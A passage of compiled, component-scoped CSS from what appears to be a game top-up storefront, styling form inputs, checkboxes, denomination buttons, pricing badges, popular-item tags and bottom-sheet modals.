    border-radius: 8px;
    background-color: var(--color-light-1);
    cursor: not-allowed
}

.disabled [class*=__placeholder][data-v-4d03e0e6],
.disabled [class*=__selected-option][data-v-4d03e0e6] {
    color: var(--color-light-4)
}

.form-error .dropdown-select[data-v-4d03e0e6] {
    outline: none;
    border: 2px solid #e9463c;
    box-shadow: 0 0 8px -2px #e9463c
}

.form-valid .dropdown-select[data-v-4d03e0e6] {
    outline: none;
    box-shadow: none
}

@keyframes fadeIn-data-v-d1426d36 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-d1426d36 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-d1426d36]:export {
    breakpointLg: 992px
}

.checkbox-container[data-v-d1426d36] {
    width: auto;
    margin: 12px 0 0
}

.checkbox-container .input-checkbox[data-v-d1426d36] {
    display: none
}

.checkbox-container .checkbox-label[data-v-d1426d36] {
    display: inline-flex;
    cursor: pointer;
    position: relative;
    align-items: flex-start
}

.checkbox-container .checkbox-label-blue[data-v-d1426d36] {
    display: inline-flex;
    cursor: pointer;
    position: relative
}

.checkbox-container .checkbox-label-blue .label-text[data-v-d1426d36] {
    color: #fff;
    padding: 0 14px;
    font-size: .8125rem
}

.checkbox-container .label-text[data-v-d1426d36] {
    font-size: .75rem;
    padding: 0 5px;
    color: var(--color-dark-main);
    font-family: NotoSans-Regular, sans-serif
}

.checkbox-container .input-checkmark[data-v-d1426d36] {
    min-width: 18px;
    max-width: 18px;
    min-height: 18px;
    max-height: 18px;
    display: inline-block;
    cursor: pointer;
    border: 1px solid var(--color-light-3);
    border-radius: 3px;
    position: relative
}

.checkbox-container .input-checkbox:checked+.input-checkmark[data-v-d1426d36] {
    background-color: var(--color-primary-main);
    border-color: transparent
}

.checkbox-container .input-checkbox:checked+.input-checkmark[data-v-d1426d36]:after {
    content: "";
    position: absolute;
    border-left: 3px solid #fff;
    border-bottom: 3px solid #fff;
    top: -3px;
    left: 0;
    right: 0;
    bottom: 0;
    margin: auto;
    width: 11px;
    height: 4px;
    transform: rotate(-45deg)
}

.checkbox-container .label-right .input-checkmark[data-v-d1426d36] {
    order: 1
}

.checkbox-container .label-left .input-checkmark[data-v-d1426d36],
.checkbox-container .label-right .label-text[data-v-d1426d36] {
    order: 2
}

.checkbox-container .label-left .label-text[data-v-d1426d36] {
    order: 1
}

@keyframes fadeIn-data-v-2e483941 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-2e483941 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-2e483941]:export {
    breakpointLg: 992px
}

.input-block.with-parenthesis[data-v-2e483941] {
    position: relative
}

.input-block label[data-v-2e483941] {
    margin-bottom: 8px;
    display: block;
    font-family: NotoSans-Bold, sans-serif;
    font-size: .75rem;
    color: var(--color-light-main)
}

.input-block .form-input--labeldark[data-v-2e483941] {
    color: var(--color-dark-main)
}

.input-block .input-holder[data-v-2e483941] {
    display: flex;
    border: 1px solid var(--color-light-4);
    border-radius: 8px;
    align-items: center;
    background: #fff;
    font-size: .875rem
}

.input-block .input-holder .prefix[data-v-2e483941] {
    color: #333;
    overflow-wrap: break-word
}

[dir=ltr] .input-block .input-holder .prefix[data-v-2e483941] {
    padding-left: 15px
}

[dir=rtl] .input-block .input-holder .prefix[data-v-2e483941] {
    padding-right: 15px
}

.input-block .input-holder .suffix[data-v-2e483941] {
    cursor: pointer
}

[dir=ltr] .input-block .input-holder .suffix[data-v-2e483941] {
    margin-right: 15px
}

[dir=rtl] .input-block .input-holder .suffix[data-v-2e483941] {
    margin-left: 15px
}

.input-block .input-holder input[data-v-2e483941] {
    width: 100%;
    padding: 0 10px;
    line-height: 46px;
    background: transparent;
    border-radius: inherit;
    border: none;
    font-size: inherit;
    outline: none;
    font-family: NotoSans-Regular, sans-serif;
    color: var(--color-dark-main)
}

.input-block .input-holder input[data-v-2e483941]:-webkit-autofill,
.input-block .input-holder input[data-v-2e483941]::placeholder {
    color: var(--color-light-4)
}

.input-block .input-holder.focussed[data-v-2e483941] {
    border-color: var(--color-dark-main)
}

.input-block .disabled[data-v-2e483941] {
    pointer-events: none;
    cursor: not-allowed;
    border-radius: 8px;
    background-color: var(--color-light-1)
}

.input-block .otp-modal[data-v-2e483941] {
    height: 80px;
    border: 1px solid var(--color-light-4)
}

.input-block .custom-amount-topup[data-v-2e483941] {
    border: none;
    color: var(--color-dark-main);
    font-family: NotoSans-Bold, sans-serif;
    outline: none
}

.input-block .font-normal[data-v-2e483941] {
    font-size: .875rem
}

.input-block .font-big[data-v-2e483941] {
    font-size: 1.375rem
}

.input-block .font-small[data-v-2e483941] {
    font-size: .75rem
}

.input-block .text-center[data-v-2e483941] {
    text-align: center
}

.input-block .font-regular[data-v-2e483941] {
    font-size: "NotoSans-Regular", sans-serif
}

.input-block .font-bold[data-v-2e483941] {
    font-size: "NotoSans-Bold", sans-serif
}

.input-block .font-light[data-v-2e483941] {
    font-size: "NotoSans-Light", sans-serif
}

.input-block .font-italic[data-v-2e483941] {
    font-size: "NotoSans-Italic", sans-serif
}

.input-block input[data-v-2e483941]::-webkit-inner-spin-button,
.input-block input[data-v-2e483941]::-webkit-outer-spin-button {
    -webkit-appearance: none;
    margin: 0
}

.input-block input[type=number][data-v-2e483941] {
    -moz-appearance: textfield
}

.input-block .form-error__input[data-v-2e483941],
.input-block .form-error__input[data-v-2e483941]:active,
.input-block .form-error__input[data-v-2e483941]:focus {
    outline: none;
    border: 2px solid #e9463c;
    box-shadow: 0 0 8px -2px #e9463c
}

.input-block .form-valid[data-v-2e483941] {
    outline: none;
    box-shadow: none
}

.input-block .form-field-parenthesis[data-v-2e483941] {
    position: absolute;
    top: 12px;
    font-size: 1.125rem
}

.input-block .form-field-parenthesis.left[data-v-2e483941],
.input-block .form-field-parenthesis.right[data-v-2e483941] {
    color: var(--color-dark-main)
}

.input-block .form-field-parenthesis.left[data-v-2e483941] {
    left: 10px
}

[dir=ltr] .input-block .form-field-parenthesis.left[data-v-2e483941]:after {
    content: "("
}

[dir=rtl] .input-block .form-field-parenthesis.left[data-v-2e483941]:after {
    content: ")"
}

.input-block .form-field-parenthesis.right[data-v-2e483941] {
    right: 10px
}

[dir=ltr] .input-block .form-field-parenthesis.right[data-v-2e483941]:after {
    content: ")"
}

[dir=rtl] .input-block .form-field-parenthesis.right[data-v-2e483941]:after {
    content: "("
}

@keyframes fadeIn {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

@keyframes fadeIn-data-v-d281e85c {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-d281e85c {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-d281e85c]:export {
    breakpointLg: 992px
}

.form-section__container[data-v-d281e85c] {
    background-color: #fff;
    border-radius: 6px;
    padding: 15px;
    margin: 25px 0;
    animation: fadeIn-data-v-d281e85c 1s ease;
    position: relative;
    padding: 15px 0 0
}

.form-section__server-info[data-v-d281e85c]:focus {
    outline: none
}

.form-section__gamer-validation--default[data-v-d281e85c],
.form-section__gamer-validation--loading[data-v-d281e85c] {
    margin: 8px 0
}

.form-section__gamer-validation--valid[data-v-d281e85c] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: .75rem;
    margin: 10px 0
}

.form-section__gamer-validation--valid p[data-v-d281e85c] {
    color: var(--color-green-5);
    margin: 0 0 4px
}

.form-section__gamer-validation--error[data-v-d281e85c] {
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: .75rem;
    margin: 10px 0
}

.form-section__gamer-validation--error p[data-v-d281e85c] {
    color: #ee3131;
    margin: 0 0 4px
}

.form-section__gifting-control[data-v-d281e85c] {
    display: flex;
    align-items: center;
    flex-flow: row nowrap;
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: .75rem;
    background: var(--color-light-7)
}

.form-section__gifting-control .checkbox-container[data-v-d281e85c] {
    margin: 0
}

.form-section__gifting-control[data-v-d281e85c] .input-checkmark {
    border: 1px solid var(--color-light-4);
    background: #fff
}

.form-section__gifting-control>.gifting-checkbox[data-v-d281e85c],
.form-section__gifting-control>.gifting-icon[data-v-d281e85c] {
    padding: 12px
}

.form-section__gifting-control>.gifting-icon[data-v-d281e85c] {
    background: var(--color-light-3)
}

[dir=ltr] .form-section__gifting-control>.gifting-icon[data-v-d281e85c] {
    margin-left: auto
}

[dir=rtl] .form-section__gifting-control>.gifting-icon[data-v-d281e85c] {
    margin-right: auto
}

.form-section__gifting-control>.gifting-icon>svg[data-v-d281e85c] {
    width: 24px;
    height: 24px
}

.form-section__gifting-control[data-v-d281e85c] .label-text {
    font-family: inherit !important
}

.form-section__gifting-control .gifting-link[data-v-d281e85c] {
    text-decoration: none
}

.form-section__name[data-v-d281e85c] {
    margin-top: 18px;
    color: var(--color-dark-main);
    max-width: 220px
}

[dir=ltr] .form-section__name[data-v-d281e85c] {
    margin-left: 50px
}

[dir=rtl] .form-section__name[data-v-d281e85c] {
    margin-right: 50px
}

.form-section__circle[data-v-d281e85c] {
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    margin: -30px 0 0;
    display: flex;
    justify-content: space-between
}

[dir=ltr] .form-section__circle[data-v-d281e85c] {
    padding-left: 15px
}

[dir=rtl] .form-section__circle[data-v-d281e85c] {
    padding-right: 15px
}

.form-section__number[data-v-d281e85c] {
    border: 4px solid #fff;
    border-radius: 50%;
    margin: 0;
    position: absolute;
    font-family: NotoSans-Bold, sans-serif;
    font-size: 1.25rem;
    line-height: 36px;
    width: 46px;
    height: 46px;
    text-align: center;
    -webkit-font-smoothing: subpixel-antialiased !important;
    -moz-osx-font-smoothing: grayscale !important;
    background-color: var(--color-primary-main);
    color: #fff
}

.form-section__formGroup[data-v-d281e85c] {
    padding: 10px 15px
}

.form-section__gameUserInput[data-v-d281e85c] {
    display: flex;
    flex-direction: row;
    flex-flow: wrap;
    align-content: center;
    max-width: 100%
}

.form-section__helper-container[data-v-d281e85c] {
    position: relative;
    display: flex;
    align-items: center;
    padding-top: 10px;
    max-height: 56px
}

.form-section__helper-container__hidden[data-v-d281e85c] {
    display: none
}

.form-section__helper-backdrop[data-v-d281e85c] {
    position: relative;
    width: 100%;
    opacity: 1;
    margin: -5px auto auto;
    visibility: visible;
    display: flex
}

.form-section__backdrop[data-v-d281e85c] {
    z-index: 100;
    transition: all .25s;
    position: absolute;
    width: 100%;
    text-align: center
}

.form-section__backdrop img[data-v-d281e85c] {
    max-height: 640px;
    max-width: 100%;
    position: relative;
    z-index: 1000
}

.form-section__backdrop__close[data-v-d281e85c] {
    text-align: center;
    color: #fff;
    display: none
}

.form-section__backdrop__close svg[data-v-d281e85c] {
    width: auto;
    height: 30px;
    cursor: pointer
}

.form-section__icon-question[data-v-d281e85c] {
    background-color: var(--color-primary-main);
    color: #fff;
    border-radius: 50%;
    width: 24px;
    height: 24px;
    line-height: 24px;
    display: inline-flex;
    justify-content: center;
    cursor: pointer
}

.form-section__instruction[data-v-d281e85c] {
    font-size: .6875rem;
    font-family: NotoSans-Italic, sans-serif;
    line-height: 15px;
    margin: 5px 0 0;
    color: var(--color-light-5);
    word-break: break-word;
    overflow-wrap: break-word
}

.form-section__label[data-v-d281e85c] {
    color: var(--color-dark-main);
    font-family: NotoSans-Regular, sans-serif;
    font-size: .8125rem
}

.user-input-fields[data-v-d281e85c] {
    max-width: 46%
}

.user-input-fields--odd[data-v-d281e85c] {
    max-width: 96%
}

.user-input-fields--experiment[data-v-d281e85c] {
    min-width: 50% !important;
    max-width: 100% !important
}

.user-input-fields--dynamic[data-v-d281e85c] {
    min-width: 100% !important;
    max-width: 100% !important
}

@media screen and (max-width:992px) {
    .form-section__backdrop[data-v-d281e85c] {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        width: 100%;
        height: 100vh;
        background-color: var(--loader-backdrop-dark);
        text-align: center;
        margin: 0 auto
    }

    .form-section__backdrop img[data-v-d281e85c] {
        max-height: 90vh;
        -o-object-fit: scale-down;
        object-fit: scale-down;
        padding: 15px
    }

    .form-section__backdrop__close[data-v-d281e85c] {
        display: block
    }
}

@media screen and (min-width:768px) {
    .form-section__name[data-v-d281e85c] {
        max-width: 98%
    }

    .user-input-fields--odd[data-v-d281e85c],
    .user-input-fields[data-v-d281e85c] {
        max-width: 46%
    }

    .user-input-fields--experiment[data-v-d281e85c] {
        min-width: 50% !important;
        max-width: 100% !important
    }

    .user-input-fields--dynamic[data-v-d281e85c] {
        min-width: 50% !important;
        max-width: 50% !important
    }
}

.smart-default-btn[data-v-d281e85c] {
    font-size: 1rem;
    font-family: NotoSans-SemiBold, sans-serif;
    cursor: pointer;
    display: flex;
    background: transparent;
    border: 0;
    padding: 8px 0;
    width: 100%;
    justify-content: space-between;
    align-items: center
}

.smart-default-btn--open[data-v-d281e85c] {
    transform: rotate(180deg)
}

.smart-default-btn--closed[data-v-d281e85c] {
    transform: rotate(0deg)
}

.gameUserInput-container[data-v-d281e85c] {
    position: relative
}

@media screen and (min-width:768px) {
    .smart-default-form[data-v-d281e85c] {
        max-width: 50%
    }

    .smart-default-btn[data-v-d281e85c] {
        justify-content: start;
        width: auto
    }

    [dir=ltr] .smart-default-btn span[data-v-d281e85c] {
        margin-right: 10px
    }

    [dir=rtl] .smart-default-btn span[data-v-d281e85c] {
        margin-left: 10px
    }
}

@keyframes fadeIn-data-v-57aff5e9 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-57aff5e9 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-57aff5e9]:export {
    breakpointLg: 992px
}

.icon-size--sm[data-v-57aff5e9] {
    width: 16px;
    height: 16px
}

.icon-size--md[data-v-57aff5e9] {
    width: 22px;
    height: 22px
}

@keyframes fadeIn-data-v-52b55834 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-52b55834 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-52b55834]:export {
    breakpointLg: 992px
}

.badge[data-v-52b55834] {
    display: inline-block;
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: .875rem;
    line-height: 20px;
    color: var(--color-text-dark);
    padding: 4px 12px;
    border-radius: 100px
}

.badge--default[data-v-52b55834] {
    background: var(--color-surface-neutral-subdued)
}

.badge--success[data-v-52b55834] {
    background: var(--color-green-3)
}

.badge--arcadia-gradient[data-v-52b55834] {
    background: linear-gradient(var(--color-tertiary-4), var(--color-tertiary-main));
    color: #fff
}

.badge__elements[data-v-52b55834] {
    display: flex;
    align-items: center
}

[dir=ltr] .badge__elements[data-v-52b55834]>:not(:first-child) {
    margin-left: 4px
}

[dir=rtl] .badge__elements[data-v-52b55834]>:not(:first-child) {
    margin-right: 4px
}

@keyframes fadeIn-data-v-3e0100a6 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-3e0100a6 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-3e0100a6]:export {
    breakpointLg: 992px
}

.sku-pricing .starting-price[data-v-3e0100a6] {
    margin: 8px 0 0 0;
    color: var(--color-tertiary-1);
    font-size: .75rem
}

.sku-pricing .starting-price .starting-price-from[data-v-3e0100a6] {
    display: block;
    font-family: NotoSans-Light, sans-serif;
    font-size: .625rem
}

.sku-pricing .comparison[data-v-3e0100a6] {
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;
    font-size: .75rem;
    padding: 0 4px
}

.sku-pricing .comparison .strike-through[data-v-3e0100a6] {
    display: inline-block;
    color: var(--color-light-4)
}

.sku-pricing .comparison .strike-through__price[data-v-3e0100a6] {
    text-decoration: line-through
}

.sku-pricing .comparison .percent[data-v-3e0100a6] {
    font-size: .75rem;
    color: #08ad36;
    padding: 2px 8px
}

[dir=ltr] .sku-pricing .comparison .percent[data-v-3e0100a6] {
    margin-left: 4px
}

[dir=rtl] .sku-pricing .comparison .percent[data-v-3e0100a6] {
    margin-right: 4px
}

.sku-pricing .unavailable[data-v-3e0100a6] {
    display: none
}

.sku-pricing .disabled[data-v-3e0100a6] {
    color: var(--color-light-4)
}

@keyframes fadeIn-data-v-6f842de2 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-6f842de2 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-6f842de2]:export {
    breakpointLg: 992px
}

.popular-tag__container[data-v-6f842de2] {
    position: absolute;
    top: -12px;
    background-image: url(https://www.codashop.com/img/popular-tag-background.png);
    background-size: cover;
    border-start-start-radius: 12px;
    border-start-end-radius: 12px;
    border-end-end-radius: 12px;
    border-end-start-radius: 0
}

[dir=ltr] .popular-tag__container[data-v-6f842de2] {
    direction: ltr
}

[dir=rtl] .popular-tag__container[data-v-6f842de2] {
    direction: rtl
}

[dir=ltr] .popular-tag__container[data-v-6f842de2] {
    left: -2px
}

[dir=rtl] .popular-tag__container[data-v-6f842de2] {
    right: -2px
}

.popular-tag__content[data-v-6f842de2] {
    color: #f6f5fc;
    padding: 0 8px;
    position: relative;
    font-size: 10px;
    display: flex;
    align-items: center
}

.popular-tag__overlay[data-v-6f842de2] {
    position: absolute;
    top: 0;
    animation: shimmer-data-v-6f842de2 2.5s ease-in infinite;
    background: linear-gradient(90deg, rgba(254, 255, 201, 0), rgba(254, 255, 201, .75) 50%, rgba(254, 255, 201, 0));
    background-repeat: no-repeat;
    background-position: 0;
    background-size: 50% 100%;
    width: 100%;
    height: 100%;
    mix-blend-mode: overlay
}

@keyframes shimmer-data-v-6f842de2 {
    0% {
        background-position: -10% 50%;
        opacity: .5
    }

    50% {
        background-position: 150% 50%;
        opacity: 1
    }

    to {
        background-position: 150% 50%;
        opacity: 0
    }
}

@keyframes fadeIn-data-v-e25a6dac {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-e25a6dac {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-e25a6dac]:export {
    breakpointLg: 992px
}

.form-section__denom[data-v-e25a6dac] {
    width: 50%;
    display: flex;
    position: relative;
    padding-bottom: 12px;
    direction: ltr;
    align-items: stretch
}

[dir=ltr] .form-section__denom[data-v-e25a6dac] {
    padding-right: 8px
}

[dir=rtl] .form-section__denom[data-v-e25a6dac] {
    padding-left: 8px
}

.form-section__denom-btn--flash-wrapper[data-v-e25a6dac] {
    height: 28px;
    width: 100%;
    border-radius: inherit;
    position: absolute;
    top: 0
}

.form-section__denom-btn--flash-timer[data-v-e25a6dac] {
    height: 28px;
    display: flex;
    justify-content: center;
    align-items: center;
    font-size: .75rem;
    color: var(--color-tertiary-main);
    line-height: 16px
}

.form-section__denom-btn--flash[data-v-e25a6dac] {
    background: var(--color-tertiary-main);
    color: #fff;
    position: absolute;
    top: 0;
    right: 0;
    height: 28px;
    border-radius: 0 16px 0 8px;
    padding: 6px 10px
}

.form-section__denom.active .form-section__denom-btn[data-v-e25a6dac] {
    border: 1px solid var(--color-primary-main);
    background-color: var(--color-primary-6)
}

.form-section__denom.active .form-section__denom-btn--popular[data-v-e25a6dac] {
    background: linear-gradient(var(--color-primary-6), var(--color-primary-6)) padding-box, linear-gradient(125deg, #e04971, #ff7f98 25%, #feffde 50%, #6242fc 75%, #522be3) border-box;
    border: 2px solid transparent
}

.form-section__denom .error-message[data-v-e25a6dac] {
    padding: 5px;
    color: #e9463c;
    font-size: .75rem;
    line-height: 1.45;
    text-align: center
}

.form-section__denom-inner[data-v-e25a6dac] {
    display: flex;
    flex-direction: column;
    min-height: 140px;
    height: 100%
}

.form-section__denom-inner.has-image[data-v-e25a6dac] {
    justify-content: space-between
}

.form-section__denom-inner.no-image[data-v-e25a6dac] {
    justify-content: center
}

.form-section__denom-inner.unavailable[data-v-e25a6dac] {
    color: var(--color-tertiary-1);
    justify-content: center
}

.form-section__denom-data-section[data-v-e25a6dac] {
    display: flex;
    flex-direction: column;
    padding: 0 12px
}

.form-section__denom-data-section__sub-title[data-v-e25a6dac] {
    font-family: NotoSans-Regular, sans-serif;
    font-size: .75em
}

.form-section__denom-img[data-v-e25a6dac] {
    height: 50px
}

.form-section__denom-btn[data-v-e25a6dac] {
    width: 100%;
    border: 1px solid var(--color-light-4);
    background-color: var(--color-light-1);
    border-radius: 16px;
    cursor: pointer;
    color: var(--color-dark-7);
    display: flex;
    flex-direction: column;
    row-gap: 10px;
    align-items: center;
    justify-content: center;
    font-size: .875rem;
    font-family: NotoSans-SemiBold, sans-serif;
    padding: 16px 3px;
    text-align: center;
    word-break: break-word;
    position: relative;
    -webkit-font-smoothing: subpixel-antialiased !important;
    -moz-osx-font-smoothing: grayscale !important
}

.form-section__denom-btn--popular[data-v-e25a6dac] {
    background: linear-gradient(#fff, #fff) padding-box, linear-gradient(125deg, #e04971, #ff7f98 25%, #feffde 50%, #6242fc 75%, #522be3) border-box;
    border: 2px solid transparent
}

.form-section__denom-btn.disabled-element[data-v-e25a6dac] {
    filter: grayscale(100%);
    cursor: not-allowed;
    color: var(--color-light-4)
}

.form-section__denom-btn.disabled-element--dynamic[data-v-e25a6dac] {
    cursor: not-allowed;
    color: var(--color-light-4)
}

[dir=ltr] .form-section__denom-btn .currency[data-v-e25a6dac] {
    margin-right: 5px
}

[dir=rtl] .form-section__denom-btn .currency[data-v-e25a6dac] {
    margin-left: 5px
}

.form-section__denom-btn .variable-denom[data-v-e25a6dac] {
    outline: none;
    width: 0
}

.form-section__denom-btn .variable-denom__active[data-v-e25a6dac] {
    width: auto
}

[dir=ltr] .form-section__denom-btn .variable-denom__active[data-v-e25a6dac] {
    padding-right: 5px
}

[dir=rtl] .form-section__denom-btn .variable-denom__active[data-v-e25a6dac] {
    padding-left: 5px
}

.form-section__denom-btn .input-variable-denom[data-v-e25a6dac] {
    border: none;
    width: 55%;
    outline: none
}

.form-section__denom-info-icon[data-v-e25a6dac] {
    display: block;
    width: 24px;
    height: 24px;
    font-family: NotoSans-Bold, sans-serif;
    font-size: .6875rem;
    text-align: center;
    position: absolute;
    margin-bottom: -12px;
    line-height: 18px;
    background-color: var(--color-secondary-main);
    border: 3px solid var(--color-dark-main);
    border-radius: 50%;
    cursor: pointer;
    bottom: 0
}

.form-section__denom-info-icon.disabled-element[data-v-e25a6dac] {
    cursor: not-allowed;
    filter: grayscale(100%)
}

.cashback-info[data-v-e25a6dac] {
    display: flex;
    justify-content: center;
    margin: 5px auto 0;
    font-size: .625rem;
    color: var(--color-text-dark);
    line-height: 12px;
    padding: 0 6px;
    word-break: break-all
}

.cashback-info .icon[data-v-e25a6dac] {
    width: 12px;
    height: 12px
}

[dir=ltr] .cashback-info .icon[data-v-e25a6dac] {
    margin-right: 5px
}

[dir=rtl] .cashback-info .icon[data-v-e25a6dac] {
    margin-left: 5px
}

@media screen and (min-width:768px) {
    .form-section__denom[data-v-e25a6dac] {
        width: 25%
    }
}

@media screen and (min-width:992px) {
    .form-section__denom[data-v-e25a6dac] {
        width: 20%
    }
}

@keyframes fadeIn-data-v-62657ed9 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-62657ed9 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-62657ed9]:export {
    breakpointLg: 992px
}

.denom-category__container[data-v-62657ed9] {
    max-width: 112px;
    height: 148px;
    padding-bottom: 10px;
    text-align: center;
    cursor: pointer;
    list-style: none
}

[dir=ltr] .denom-category__container[data-v-62657ed9] {
    margin-right: 8px
}

[dir=rtl] .denom-category__container[data-v-62657ed9] {
    margin-left: 8px
}

.denom-category__container.no-icon[data-v-62657ed9] {
    height: 80px;
    max-width: 162px
}

.denom-category__container.active .denom-category__wrapper[data-v-62657ed9] {
    border: 1px solid var(--color-primary-main);
    background-color: var(--color-primary-6)
}

.denom-category__wrapper[data-v-62657ed9] {
    border: 1px solid var(--color-light-4);
    background-color: var(--color-light-1);
    border-radius: 16px;
    color: var(--color-dark-7);
    padding: 10px;
    display: flex;
    flex-flow: column nowrap;
    align-items: center;
    justify-content: center;
    font-size: .875rem;
    font-family: NotoSans-SemiBold, sans-serif;
    height: 100%;
    min-width: 112px
}

.denom-category__wrapper.no-icon[data-v-62657ed9] {
    min-width: 162px
}

.denom-category__wrapper.selected[data-v-62657ed9] {
    border: 1px solid var(--color-primary-main);
    background-color: var(--color-primary-6)
}

.denom-category__img-container[data-v-62657ed9] {
    max-width: 50px;
    max-height: 50px
}

.denom-category__img-container img[data-v-62657ed9] {
    display: block;
    max-width: 100%
}

.denom-category__name[data-v-62657ed9] {
    text-align: center;
    direction: ltr;
    margin: auto;
    overflow: hidden;
    max-width: 100%
}

.denom-category__info-icon[data-v-62657ed9] {
    width: 24px;
    height: 24px;
    background-color: var(--color-secondary-main);
    border: 3px solid var(--color-dark-main);
    border-radius: 50%;
    display: block;
    margin: -12px auto auto;
    font-size: .6875rem;
    line-height: 18px;
    font-family: NotoSans-Bold, sans-serif
}

@keyframes fadeIn-data-v-1a6c2f34 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-1a6c2f34 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-1a6c2f34]:export {
    breakpointLg: 992px
}

svg.warning path[data-v-1a6c2f34] {
    fill: var(--color-secondary-main)
}

svg.info path[data-v-1a6c2f34] {
    fill: #6f6b80
}

svg.alert path[data-v-1a6c2f34] {
    fill: var(--color-yellow-3)
}

@keyframes fadeIn-data-v-1f9f38cc {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-1f9f38cc {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-1f9f38cc]:export {
    breakpointLg: 992px
}

.fade-enter-active[data-v-1f9f38cc],
.fade-leave-active[data-v-1f9f38cc] {
    transition: opacity .5s
}

.fade-enter[data-v-1f9f38cc],
.fade-leave-to[data-v-1f9f38cc] {
    opacity: 0
}

.modal-backdrop[data-v-1f9f38cc] {
    background-color: rgba(0, 0, 0, .5);
    position: fixed;
    top: 0;
    width: 100%;
    height: 100%;
    z-index: 10;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: scroll
}

[dir=ltr] .modal-backdrop[data-v-1f9f38cc] {
    left: 0
}

[dir=rtl] .modal-backdrop[data-v-1f9f38cc] {
    right: 0
}

.bottom-sheet[data-v-1f9f38cc] {
    font-family: NotoSans-Regular, sans-serif;
    background-color: #fff;
    color: var(--color-dark-main);
    width: 100%;
    margin: auto;
    position: fixed;
    top: 100%;
    font-size: .875rem;
    border-radius: 16px 16px 0 0
}

.bottom-sheet.show[data-v-1f9f38cc] {
    transform: translateY(-100%);
    transition: .4s ease-in-out
}

.bottom-sheet__header[data-v-1f9f38cc] {
    display: flex;
    align-items: center;
    font-family: NotoSans-SemiBold, sans-serif;
    font-size: 1.125rem;
    line-height: 28px;
    letter-spacing: .04em;
    padding: 15px 16px
}

.bottom-sheet__header.with-title[data-v-1f9f38cc] {
    border-bottom: 1px solid #cbcad0
}

.bottom-sheet__body[data-v-1f9f38cc] {
    overflow-x: hidden;
    overflow-y: auto;
    height: 100%;
    max-height: 66vh;
    min-height: 40vh;
    border-radius: 0 0 15px
}

.bottom-sheet__body.no-footer[data-v-1f9f38cc],
.bottom-sheet__body.no-header[data-v-1f9f38cc] {
    max-height: 75vh
}

.bottom-sheet__body.no-footer.no-header[data-v-1f9f38cc] {
    border-radius: 15px;
    max-height: 90vh
}

.bottom-sheet__body[data-v-1f9f38cc] ul {
    padding: 0 25px
}

.bottom-sheet__body[data-v-1f9f38cc] a {
    color: var(--color-primary-main)
}

.bottom-sheet__body[data-v-1f9f38cc] b {
    font-family: NotoSans-Bold, sans-serif
}

.bottom-sheet__footer[data-v-1f9f38cc] {
    display: flex;
    justify-content: center;
    padding: 16px
}

@media screen and (min-width:768px) {
    .bottom-sheet[data-v-1f9f38cc] {
        width: 450px;
        border-radius: 16px;
        position: relative;
        top: unset
    }

    .bottom-sheet.show[data-v-1f9f38cc] {
        transform: unset;
        transition: unset
    }
}

@keyframes fadeIn-data-v-64db8779 {
    0% {
        opacity: 0
    }

    to {
        opacity: 1
    }
}

@keyframes placeHolderShimmer-data-v-64db8779 {
    0% {
        background-position: 0 50%
    }

    50% {
        background-position: 100% 51%
    }

    to {
        background-position: 0 50%
    }
}

[data-v-64db8779]:export {
    breakpointLg: 992px
}

.cashback-explainer__content[data-v-64db8779] {
    display: flex;
    flex-direction: column
}

.cashback-explainer__header[data-v-64db8779] {
